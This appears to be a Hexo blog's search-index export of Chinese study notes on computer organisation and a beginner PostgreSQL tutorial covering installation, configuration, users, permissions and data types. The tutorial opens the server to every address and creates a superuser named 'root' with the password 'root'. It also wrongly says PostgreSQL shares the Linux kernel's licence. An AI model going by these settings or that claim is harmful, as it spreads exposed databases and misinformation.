<li>CPU：运算器与控制器合并到微处理器</li>
<li>以存储器为核心，IO设备尽可能绕过CPU</li>
</ul>
<p><img src="/./assets/20241008/b4efaa25cd38480f82645db049713342.png" alt="现代计算机结构"></p>
<h1 id="以存储器为中心的计算机结构"><a href="#以存储器为中心的计算机结构" class="headerlink" title="以存储器为中心的计算机结构"></a>以存储器为中心的计算机结构</h1><p><img src="/./assets/20241008/41d944c0d6d14a8ca5ed1a3ea84a0e28.png" alt="以存储器为中心的计算机结构"></p>
<h1 id="现代计算机组织结构-1"><a href="#现代计算机组织结构-1" class="headerlink" title="现代计算机组织结构"></a>现代计算机组织结构</h1><p><img src="/./assets/20241008/3ef82923745247f199de104d1ac0c1e4.png" alt="现代计算机组织结构"></p>
]]></content>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机的工作过程</title>
    <url>/2024/10/08/20241008-03.html</url>
    <content><![CDATA[<h1 id="从源文件到可执行文件"><a href="#从源文件到可执行文件" class="headerlink" title="从源文件到可执行文件"></a>从源文件到可执行文件</h1><ol>
<li>预处理阶段</li>
</ol>
<ul>
<li>高级语言：C&#x2F;C++、Java、GO</li>
<li>删注释；引入包含文件</li>
</ul>
<ol start="2">
<li>编译阶段</li>
</ol>
<ul>
<li>汇编语言：指令代码</li>
</ul>
<ol start="3">
<li>汇编阶段</li>
</ol>
<ul>
<li>机器语言：二进制编码</li>
</ul>
<ol start="4">
<li>链接阶段</li>
</ol>
<ul>
<li>+库函数</li>
</ul>
<p><img src="/./assets/20241008/e4e1d30288de4318a116521fd9a8cc3d.png" alt="计算机的工作过程"></p>
]]></content>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机的性能指标</title>
    <url>/2024/10/10/20241010-01.html</url>
    <content><![CDATA[<h1 id="机器字长"><a href="#机器字长" class="headerlink" title="机器字长"></a>机器字长</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>也叫基本字长，参与运算的二进制数据的位数，决定了寄存器、ALU、数据总线位数，代表了运算精度</p>
<h2 id="易混淆概念"><a href="#易混淆概念" class="headerlink" title="易混淆概念"></a>易混淆概念</h2><ul>
<li>机器字长：一般等于内部寄存器的大小</li>
<li>指令字长：一个指令包含的二进制码的位数</li>
<li>存储字长：存储单元的二进制码的长度&#x2F;位数</li>
</ul>
<p>注意：所有字长都必须是字节的整数倍。</p>
<p><img src="/./assets/20241010/71d36dda134e40c8b96ea996496f097f.png" alt="机器字长"></p>
<h1 id="主存容量"><a href="#主存容量" class="headerlink" title="主存容量"></a>主存容量</h1><h2 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h2><p>一般指主存的最大容量，单位是字节Byte，运行时程序和数据都在主存中，主存容量越大，可运行的程序就越多，MAR位数（但不一定是当前机器安装内存的容量）决定了可寻址范围的最大值。</p>
<p><img src="/./assets/20241010/624d4dca02014be5875079492bd2f194.png" alt="主存容量"></p>
<h1 id="运算速度"><a href="#运算速度" class="headerlink" title="运算速度"></a>运算速度</h1><h2 id="吞吐量："><a href="#吞吐量：" class="headerlink" title="吞吐量："></a>吞吐量：</h2><p>单位时间内处理的请求数量，由如下因素决定：</p>
<ul>
<li>信息输入内存的速度</li>
<li>CPU取指令的速度</li>
<li>数据取出&#x2F;存入内存的速度</li>
<li>从内存转出到外部设备的速度</li>
</ul>
<h2 id="响应时间"><a href="#响应时间" class="headerlink" title="响应时间"></a>响应时间</h2><p>从用户发送请求到收到响应经过的时间，，由如下因素决定：</p>
<ul>
<li>CPU时间（运行程序花费的时间）</li>
<li>等待时间（磁盘访问&#x2F;主存访问&#x2F;IO操作&#x2F;OS开销&#x2F;网络传输）</li>
</ul>
<h2 id="CPU时钟周期"><a href="#CPU时钟周期" class="headerlink" title="CPU时钟周期"></a>CPU时钟周期</h2><p>单个动作所花费的时间</p>
<ul>
<li>节拍脉冲或T周期，即主频的倒数</li>
<li>CPU中最小的时间单位，每个动作至少一个时钟周期</li>
<li>单位：秒</li>
</ul>
<h2 id="主频（CPU时钟频率）"><a href="#主频（CPU时钟频率）" class="headerlink" title="主频（CPU时钟频率）"></a>主频（CPU时钟频率）</h2><p>单位时间完成基本动作的数量</p>
<ul>
<li>机器内部主时钟的频率</li>
<li>主频越高花费时间越短，执行指令速度越快</li>
<li>单位：Hz（赫兹），即次数&#x2F;秒</li>
<li>时钟周期 &#x3D; 1&#x2F;主频</li>
</ul>
<h2 id="CPI（Clock-cycle-Per-Instruction）"><a href="#CPI（Clock-cycle-Per-Instruction）" class="headerlink" title="CPI（Clock cycle Per Instruction）"></a>CPI（Clock cycle Per Instruction）</h2><p>执行一条指令所需的时钟周期数</p>
<h2 id="CPU执行时间"><a href="#CPU执行时间" class="headerlink" title="CPU执行时间"></a>CPU执行时间</h2><p>即运行一个程序所花费的时间，&#x3D; CPU时钟周期数&#x2F;主频&#x3D;（指令条数 * CPI）&#x2F;主频</p>
<p>三要素（相互制约）：</p>
<ul>
<li>主频（时钟频率）</li>
<li>每条指令所用的时钟周期数（CPI）</li>
<li>指令条数</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>MIPS：Million Instructions Per Second &#x3D; 指令条数&#x2F;（执行时间*10^6）</li>
<li>MFLOPS：Mega Floating-point Operations PS &#x3D; 浮点数操作次数&#x2F;(执行时间*10^6)</li>
<li>GFLOPS：Giga Floating-point Operations PS &#x3D; 浮点数操作次数&#x2F;(执行时间*10^9)</li>
<li>TFLOPS：Tera Floating-point Operations PS &#x3D; 浮点数操作次数&#x2F;(执行时间*10^12)</li>
</ul>
]]></content>
      <tags>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL介绍</title>
    <url>/2024/10/10/20241010-02.html</url>
    <content><![CDATA[<p>PostgreSQL是一个功能强大的 <strong>开源</strong> 的关系型数据库，底层基于C实现。</p>
<p>PostgreSQL的开源协议和Linux内核版本的开源协议是一样的。也就是BSD协议，这个协议基本和MIT开源协议一样，就是你可以对PostgreSQL进行一些封装，然后商业化来收费。</p>
<p>PostgreSQL的名字咋来的：之前叫Ingres，后面为了解决一些Ingres中的一些问题，作为后面的Ingres，就起名叫Postgre。</p>
<p>PostgreSQL版本迭代的速度比较快，现在最新的正式的发布版本，已经到了15.RELEASE。</p>
<p>PostgreSQL的版本选择一般有两种：</p>
<ul>
<li>如果为了稳定的运行，推荐使用12.x版本。</li>
<li>如果想体验新特性，推荐使用14.x版本。</li>
</ul>
<p>PostgreSQL允许跨版本升级，而且没有什么大问题。</p>
<p>PostgreSQL社区特别活跃，基本是三个月一发版，也就意味着很多常见的BUG都可以得到及时的修复。</p>
<p>PostgreSQL其实在国外使用的比较多，国内暂时还是以MySQL为主。</p>
<p>但是国内很多国产数据库都是基于PostgreSQL做的二次封装：比如华为GaussDB，还有腾讯的Tbase等。</p>
<p>甚至很多公司原来用的Oracle，直接平转到PostgreSQL，同时国内的很多云厂商都支持PostgreSQL了。</p>
<p>PostgreSQL因为开源，所以有很多做数据迁移的工具，可以快速的从MySQL，SQLServer，Oracle直接平转到PostgreSQL，比如pgloader这样的数据迁移工具。</p>
<p>PostgreSQL的官方社区地址：<a href="https://www.postgresql.org/">https://www.postgresql.org/</a></p>
<p>PostgreSQL的国内社区地址：<a href="http://www.postgres.cn/v2/home">http://www.postgres.cn/v2/home</a></p>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL和MySQL的区别</title>
    <url>/2024/10/10/20241010-03.html</url>
    <content><![CDATA[<p>技术没有好坏之分，主要看一下是否符合业务的需要，能否解决业务需求；其次也要看社区的活跃度以及更新的频次。</p>
<p>MySQL不支持的几点内容：</p>
<ul>
<li>MySQL的数据类型不够丰富；</li>
<li>MySQL不支持序列概念（Sequence）；</li>
<li>使用MySQL时，网上比较好用的插件；</li>
<li>MySQL的性能优化监控工具不是很多，定位问题的成本是比较高；</li>
<li>MySQL的主从复制没有一个官方的同步策略，同步问题难以解决；</li>
<li>MySQL虽然开源但不够彻底。</li>
</ul>
<p>PostgreSQL相对MySQL上述问题的特点：</p>
<ul>
<li>PostgreSQL的数据类型嘎嘎丰富；</li>
<li>PostgreSQL是有序列的概念的；</li>
<li>PostgreSQL的插件特别丰富；</li>
<li>PostgreSQL支持主从复制的同步操作，可以实现数据的零丢失；</li>
<li>PostgreSQL的MVCC实现和MySQL不大一样（PostgreSQL一行数据会存储多个版本，最多可以存储40亿个事务版本）。</li>
</ul>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL的安装</title>
    <url>/2024/10/10/20241010-04.html</url>
    <content><![CDATA[<p>主要在Linux中安装，不推荐在Windows下安装。</p>
<p>Linux的版本尽量使用CentOS 7.x版本，最好是7.6或者是7.8版本。</p>
<p>去官网找安装的方式：</p>
<p><img src="/./assets/20241010/ce79cee2b6394311893c70e20da3a96a.png" alt="官网安装方式"></p>
<p>选择好PostgreSQL的版本，以及Linux的发行版本</p>
<p><img src="/./assets/20241010/a1bcec660b7e4beb937627a5c044f64b.png" alt="Linux安装12版本"></p>
<p>拿到命令直接在Linux中运行即可</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载PGSQL的rpm包</span></span><br><span class="line"><span class="built_in">sudo</span> yum install -y https://download.postgresql.org/pub/repos/yum/reporpms/EL-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm</span><br><span class="line"><span class="comment"># 安装PGSQL12的软件程序，需要下载，需要等一会，一般不会失败，即便失败，他也会重新帮你找镜像</span></span><br><span class="line"><span class="built_in">sudo</span> yum install -y postgresql12-server</span><br><span class="line"><span class="comment"># 数据库初始化</span></span><br><span class="line"><span class="built_in">sudo</span> /usr/pgsql-12/bin/postgresql-12-setup initdb</span><br><span class="line"><span class="comment"># 设置开启启动项，并设置为开启自行启动</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> postgresql-12</span><br><span class="line"><span class="comment"># 启动PGSQL</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl start postgresql-12</span><br></pre></td></tr></table></figure>
<p>这种属于Windows下的傻瓜式安装，基本不会出错。</p>
<p>如果出错，可能是如下的问题：</p>
<ul>
<li>安装Linux的时候，一定要选择最小安装；</li>
<li>Linux不能连接外网；</li>
<li>Linux中的5432端口可能被占用。</li>
</ul>
<p>PostgreSQL不推荐使用root管理，在安装成功postgreSQL后，他默认会给你创建一个用户：postgres</p>
<p>使用PostgreSQL前需要先切换到postgres</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su postgres</span><br></pre></td></tr></table></figure>

<p>切换到postgres用户后，直接输入psql即可进入到postgreSQL提供的客户端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 进入命令行</span><br><span class="line">psql</span><br><span class="line"># 查看有哪些库，如果是新安装的，有三个库：postgres，template0，template1</span><br></pre></td></tr></table></figure>

<p>Windows版本的下载地址：<a href="https://sbp.enterprisedb.com/getfile.jsp?fileid=1258242">https://sbp.enterprisedb.com/getfile.jsp?fileid=1258242</a></p>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL的配置</title>
    <url>/2024/10/10/20241010-05.html</url>
    <content><![CDATA[<p>两个配置文件：</p>
<ul>
<li>PostgreSQL的远程连接配置；</li>
<li>PostgreSQL的日志配置。</li>
</ul>
<p>PostgreSQL的主要配置放在数据目录下的， <strong>postgresql.conf</strong> 以及 <strong>pg_hba.conf</strong> 配置文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置文件目录</span></span><br><span class="line"><span class="built_in">ls</span> -l /var/lib/pgsql/12/data</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241010/c3f3386b5adf4a92ad6c30d34313c8c1.png" alt="配置文件"></p>
<p>上图可以看到，PostgreSQL的核心文件，都属于postgres用户，操作的时候，别用root用户，容易出问题，先切换到postgres用户再操作。</p>
<h1 id="远程连接配置"><a href="#远程连接配置" class="headerlink" title="远程连接配置"></a>远程连接配置</h1><p>PostgreSQL默认情况下不支持远程连接的，这个跟MySQL一样。</p>
<ul>
<li>MySQL给mysql.user追加用户，一般是采用grant的命令添加；</li>
<li>PostgreSQL要基于配置文件修改，才能制定用户是否可以远程连接。</li>
</ul>
<p>修改pg_hba.conf配置文件</p>
<p>用户以及对应数据库和连接方式的编写模板：</p>
<p><img src="/./assets/20241010/df6c3f8af68240968efa999a51f6d9bd.png" alt="用户权限配置模板"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一块</span><br><span class="line">local：代表本地连接，host代表可以指定连接的ADDRESS</span><br><span class="line"># 第二块</span><br><span class="line">database编写数据库名，如果写all，代表所有库都可以连接</span><br><span class="line"># 第三块</span><br><span class="line">user编写连接的用户，可以写all，代表所有用户</span><br><span class="line"># 第四块</span><br><span class="line">address代表那些IP地址可以连接</span><br><span class="line"># 第五块</span><br><span class="line">method加密方式，这块不用过多关注，使用md5即可</span><br><span class="line"># 示例配置：允许任意地址的全部用户连接所有数据库</span><br><span class="line">host    all             all             0.0.0.0/0               md5</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241010/0db1d87dd92b4068901649bf73c61dcd.png" alt="pg_hba.conf示例配置"></p>
<p>为了实现远程连接，除了用户级别的这种配置，还要针对服务级别修改一个配置</p>
<p>服务级别的配置在postgresql.conf</p>
<p><img src="/./assets/20241010/52be7e1942834f18bf7d3109b342b842.png" alt="postgresql.conf原始配置"></p>
<p>发现默认情况下，PostgreSQL只允许localhost连接，直接配置为*即可解决问题</p>
<p><img src="/./assets/20241010/6f72192536624fe6bd9ec40e411afbe3.png" alt="postgresql.conf示例配置"></p>
<p>为了生效，需要重启服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用root用户重启</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl restart postgresql-12</span><br></pre></td></tr></table></figure>

<h1 id="数据库的日志配置"><a href="#数据库的日志配置" class="headerlink" title="数据库的日志配置"></a>数据库的日志配置</h1><p>查看postgresql.conf文件</p>
<p><img src="/./assets/20241010/210375d9a72e40639750216606d2e2a0.png" alt="postgresql.conf日志原始配置"></p>
<p>PostgreSQL默认情况下，只保存7天的日志，循环覆盖。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 代表日志是开启的。</span><br><span class="line">logging_collector = on</span><br><span class="line"># 日志存放的路径，默认放到当前目录下的log里</span><br><span class="line">log_directory = &#x27;log&#x27;</span><br><span class="line"># 日志的文件名，默认是postgresql为前缀，星期作为后缀</span><br><span class="line">log_filename = &#x27;postgresql-%a.log&#x27;</span><br><span class="line"># 默认一周过后，日志文件会被覆盖</span><br><span class="line">log_truncate_on_rotation = on</span><br><span class="line"># 一天一个日志文件</span><br><span class="line">log_rotation_age = 1d</span><br><span class="line"># 一个日志文件，没有大小限制</span><br><span class="line">log_rotation_size = 0</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL的基础操作</title>
    <url>/2024/10/10/20241010-06.html</url>
    <content><![CDATA[<p>在psql命令行（客户端）下，执行了一次\l，查看所有的库信息</p>
<p>可以直接基于psql查看一些信息，也可以基于psql进入到命令行后，再做具体操作</p>
<p><img src="/./assets/20241010/dcd871238f4549649018fc8b07c6dc93.png" alt="\l查看所有的库信息"></p>
<p>可以直接基于psql操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以使用psql --help，查看psql的命令</span><br><span class="line">可以直接进入到命令行的原因是psql默认情况下，就是以postgres用户去连接本地的pgsql，所以可以直接进入</span><br><span class="line">下面的图是默认的连接方式</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241010/490b99cc853d406e87a8f9b05a1c88e9.png" alt="默认连接方式"></p>
<p>后面都基于psql的命令行（客户端）去进行操作</p>
<p>命令不用背，需要使用的时候，直接找帮助文档，在psql命令行中，直接输入如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\help，即可查看到数据库级别的一些命令</span><br><span class="line">\?，可以查看到服务级别的一些命令</span><br></pre></td></tr></table></figure>

<h1 id="用户相关"><a href="#用户相关" class="headerlink" title="用户相关"></a>用户相关</h1><p>构建用户命令：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">create</span> <span class="keyword">user</span>默认有连接权限，而<span class="keyword">create</span> role没有，但可以基于选项设置</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> 名称 [ [ <span class="keyword">WITH</span> ] 选项 [ ... ] ]</span><br><span class="line"><span class="keyword">CREATE</span> ROLE 名称 [ [ <span class="keyword">WITH</span> ] 选项 [ ... ] ]</span><br></pre></td></tr></table></figure>

<p>创建一个超级管理员用户：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> root <span class="keyword">WITH</span> SUPERUSER PASSWORD <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241010/b10afe02df1c45b6bdab8f03eced03f5.png" alt="创建超级管理员"></p>
<p>退出psql命令行</p>
<p><img src="/./assets/20241010/e31c67986b4d4570ad70200065d9e704.png" alt="退出命令行"></p>
<p>尝试去用root用户登录的psql命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">psql -h 192.168.11.32 -p 5432 -U root -W</span><br></pre></td></tr></table></figure>

<p>根据提示发现，光有用户不让登录，用户需要有一个数据库，创建一个root库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create database root;</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241010/d338efe105a44718969fbb369450e38d.png" alt="创建数据库"></p>
<p>可以在不退出psql的前提下，直接切换数据库</p>
<p><img src="/./assets/20241010/248de5f3be7446f5be9adf5225560268.png" alt="切换数据库"></p>
<p>也可以退出psql，重新基于psql命令去切换用户以及数据库</p>
<p>如果要修改用户信息，或者删除用户，可以查看</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改用户，直接基于ALTER命令操作</span></span><br><span class="line"><span class="comment"># 删除用户，直接基于DROP命令操作</span></span><br></pre></td></tr></table></figure>

<p>如果要查看现在的全部用户信息</p>
<p><img src="/./assets/20241010/d85d11baa4474370b5a4c97a18c07581.png" alt="查看全部用户信息"></p>
<h1 id="权限操作"><a href="#权限操作" class="headerlink" title="权限操作"></a>权限操作</h1><p>权限操作前，要先掌握一下PGSQL的逻辑结构</p>
<p><img src="/./assets/20241010/0ca8c4fb119f44d5befe8020a2cd416a.png" alt="逻辑结构图"></p>
<p>PostgreSQL一个数据库中有多个schema，在每个schema下都有自己的相应的表信息，权限粒度比MySQL更细一些。</p>
<p>在PostgreSQL中，权限的管理分为很多多层：</p>
<ul>
<li>server、cluster、tablespace级别：基于pg_hba.conf去配置；</li>
<li>database级别：通过grant命令操作；</li>
<li>namespace、schema级别：使用不多，暂不了解；</li>
<li>对象级别：通过grant命令去设置。</li>
</ul>
<p>对database或者是对象级别做权限控制可以直接基于grant命令去操作，查看grant命令的使用帮助：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看grant命令</span></span><br><span class="line">\<span class="built_in">help</span> grant</span><br></pre></td></tr></table></figure>

<h2 id="小任务"><a href="#小任务" class="headerlink" title="小任务"></a>小任务</h2><ul>
<li>构建一个用户</li>
<li>构建一个数据库</li>
<li>在这个数据库下构建一个schema（数据库默认有一个public的schema）</li>
<li>将这个schema的权限赋予用户</li>
<li>在这个schema下构建一个表</li>
<li>将表的select，update，insert权限赋予用户</li>
</ul>
<h2 id="完成上述操作"><a href="#完成上述操作" class="headerlink" title="完成上述操作"></a>完成上述操作</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 准备用户</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> user_oliver <span class="keyword">with</span> password <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"><span class="comment">-- 准备数据库</span></span><br><span class="line"><span class="keyword">create</span> database database_oliver;</span><br><span class="line"><span class="comment">-- 切换数据库</span></span><br><span class="line">\c db_oliver;</span><br><span class="line"><span class="comment">-- 构建schema</span></span><br><span class="line"><span class="keyword">create</span> schema schema_oliver;</span><br><span class="line"><span class="comment">-- 将schema的拥有者修改为oliver用户</span></span><br><span class="line"><span class="keyword">alter</span> schema schema_oliver owner <span class="keyword">to</span> user_oliver;</span><br><span class="line"><span class="comment">-- 将database_oliver库下的schema_oliver的schema中的表的增，改，查权限赋予给user_oliver用户</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span> <span class="keyword">on</span> <span class="keyword">all</span> tables <span class="keyword">in</span> schema schema_oliver <span class="keyword">to</span> user_oliver;</span><br><span class="line"><span class="comment">-- 用postgres用户先构建一张表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> schema_oliver.test(id <span class="type">int</span>);</span><br><span class="line"><span class="comment">-- 切换到user_oliver用户。</span></span><br><span class="line">\c user_oliver <span class="operator">-</span>password </span><br><span class="line"><span class="comment">-- 报错：</span></span><br><span class="line"><span class="comment">-- 致命错误:  对用户&quot;-user_oliver&quot;的对等认证失败</span></span><br><span class="line"><span class="comment">-- Previous connection kept</span></span><br><span class="line"><span class="comment">-- 上述方式直接凉凉，原因是匹配连接方式时，基于pg_hba.conf文件去从上往下找</span></span><br><span class="line"><span class="comment">-- 找到的第一个是local，匹配上的。发现连接方式是peer。</span></span><br><span class="line"><span class="comment">-- peer代表用当前系统用户去连接PostgreSQL</span></span><br><span class="line"><span class="comment">-- 当前系统用户只有postgres，没有user_oliver，无法使用peer连接</span></span><br><span class="line"><span class="comment">-- 想构建user_oliver用户时，发现PostgreSQL的所有文件拥有者和所属组都是postgres，并且能操作的只有拥有者</span></span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241010/7d9dc08d006c4b8fb7959b63f8138c07.png" alt="文件权限"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 基于上述问题，不采用本地连接即可。</span><br><span class="line">-- 采用远程连接。</span><br><span class="line">psql -h 127.0.0.1 -p 5432 -U user_oliver -W</span><br><span class="line">-- 这样依赖，跳过了local链接方式的匹配，直接锁定到后面的host，host的连接方式是md5，md5其实就是密码加密了。</span><br><span class="line">-- 登录后，直接输入</span><br><span class="line">\dn</span><br><span class="line">-- 查看到当前database下有两个schema</span><br></pre></td></tr></table></figure>

<p>这种权限的赋予方式，可以用管理员用户去构建整体表结构，分配指定用户，赋予不同的权限，就不怕用户误操作了。</p>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL图形化界面pgAdmin安装使用</title>
    <url>/2024/10/11/20241011-01.html</url>
    <content><![CDATA[<p>图形化界面可以连接PostgreSQL的很多，Navicat（收费）。</p>
<p>也可以直接使用PostgreSQL官方提供的图形化界面（完全免费）。</p>
<p>pgAdmin官方地址：<a href="https://www.pgadmin.org/">https://www.pgadmin.org/</a></p>
<p>Windows安装包下载地址：<a href="https://www.postgresql.org/ftp/pgadmin/pgadmin4/v6.9/windows/">https://www.postgresql.org/ftp/pgadmin/pgadmin4/v6.9/windows/</a></p>
<p>下载后，一直下一步进行傻瓜式安装。</p>
<h1 id="打开pgAdmin"><a href="#打开pgAdmin" class="headerlink" title="打开pgAdmin"></a>打开pgAdmin</h1><p><img src="/./assets/20241011/4469cb29ad264370a062003171e87b86.png" alt="首次打开设置密码"></p>
<h1 id="添加一个连接"><a href="#添加一个连接" class="headerlink" title="添加一个连接"></a>添加一个连接</h1><p><img src="/./assets/20241011/887772b05f504814b326794ca72051f4.png" alt="添加一个连接"></p>
<p>保存</p>
<h1 id="查看数据库的信息"><a href="#查看数据库的信息" class="headerlink" title="查看数据库的信息"></a>查看数据库的信息</h1><p><img src="/./assets/20241011/23b5dd8af15c4bdc837910ead0cb3e89.png" alt="查看连接"></p>
<h1 id="切换语言"><a href="#切换语言" class="headerlink" title="切换语言"></a>切换语言</h1><p><img src="/./assets/20241011/61b55c22e93349f097d76d09b0e66285.png" alt="切换语言"></p>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL数据类型</title>
    <url>/2024/10/11/20241011-02.html</url>
    <content><![CDATA[<p>PostgreSQL支持的类型特别丰富，大多数的类型和MySQL都有对应的关系</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
<th>对比MySQL</th>
</tr>
</thead>
<tbody><tr>
<td>布尔类型</td>
<td>boolean，标准的布尔类型，只能存储true，false</td>
<td>MySQL中虽然没有对应的boolean，但是有替换的类型，数值的tinyint类型，和PostgreSQL的boolean都是占1个字节。</td>
</tr>
<tr>
<td>整型</td>
<td>smallint（2字节），integer（4字节），bigint（8字节）</td>
<td>跟MySQL没啥区别。</td>
</tr>
<tr>
<td>浮点型</td>
<td>decimal，numeric（和decimal一样，精准浮点型），real（float），double precision（double），money（货币类型）</td>
<td>和MySQL基本也没区别，MySQL支持float，double，decimal。MySQL没有这个货币类型。</td>
</tr>
<tr>
<td>字符串类型</td>
<td>varchar(n)（character varying），char(n)（character），text</td>
<td>这里和MySQL基本没区别。但PostgreSQL存储的varchar类型，可以存储一个G。MySQL最大存储65535b。</td>
</tr>
<tr>
<td>日期类型</td>
<td>date（年月日），time（时分秒），timestamp（年月日时分秒）（time和timestamp可以设置时区）</td>
<td>没啥说的，和MySQL基本没区别，但MySQL有个datetime。</td>
</tr>
<tr>
<td>二进制类型</td>
<td>bytea-存储二进制类型</td>
<td>MySQL也支持，MySQL中是blob</td>
</tr>
<tr>
<td>位图类型</td>
<td>bit(n)（定长位图），bit varying(n)（可变长度位图）</td>
<td>就是存储0，1。MySQL也有，用的不多。</td>
</tr>
<tr>
<td>枚举类型</td>
<td>enum，跟Java的enum一样</td>
<td>MySQL支持。</td>
</tr>
<tr>
<td>几何类型</td>
<td>点，直线，线段，圆等等</td>
<td>MySQL不支持，一般开发不用。</td>
</tr>
<tr>
<td>数组类型</td>
<td>在类型后，追加[]，代表存储数组</td>
<td>MySQL不支持</td>
</tr>
<tr>
<td>JSON类型</td>
<td>json（存储JSON数据的文本），jsonb（存储JSON二进制）</td>
<td>可以存储JSON，MySQL8.x也支持</td>
</tr>
<tr>
<td>IP类型</td>
<td>cidr（存储ip地址）</td>
<td>MySQL不支持</td>
</tr>
</tbody></table>
<p>其他类型：<a href="http://www.postgres.cn/docs/12/datatype.html">http://www.postgres.cn/docs/12/datatype.html</a></p>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL基本操作和数据类型</title>
    <url>/2024/10/11/20241011-03.html</url>
    <content><![CDATA[<h1 id="单引号和双引号"><a href="#单引号和双引号" class="headerlink" title="单引号和双引号"></a>单引号和双引号</h1><p>在PostgreSQL中，写SQL语句时：</p>
<ul>
<li>单引号用来标识实际的值；</li>
<li>双引号用来标识一个关键字，比如表名，字段名。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 单引号写具体的值，双引号类似MySQL的``标记，用来填充关键字</span></span><br><span class="line"><span class="comment">-- 下面的葡萄牙会报错，因为葡萄牙不是关键字</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1.414</span>,<span class="string">&#x27;卡塔尔&#x27;</span>,&quot;葡萄牙&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h1><p>第一种方式：只需要在值的前面，添加上具体的数据类型即可</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 将字符串转成位图类型</span></span><br><span class="line"><span class="keyword">select</span> bit <span class="string">&#x27;010101010101001&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>第二种方式：也可以在具体值的后面，添加上 ::类型，来指定</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 数据类型</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;2011-11-11&#x27;</span>::<span class="type">date</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;101010101001&#x27;</span>::bit(<span class="number">20</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;13&#x27;</span>::<span class="type">int</span>;</span><br></pre></td></tr></table></figure>

<p>第三种方式：使用CAST函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 类型转换的完整写法</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">CAST</span>(<span class="type">varchar</span> <span class="string">&#x27;100&#x27;</span> <span class="keyword">as</span> <span class="type">int</span>);</span><br></pre></td></tr></table></figure>

<h1 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h1><p>布尔类型可以存储三个值，true，false，null</p>
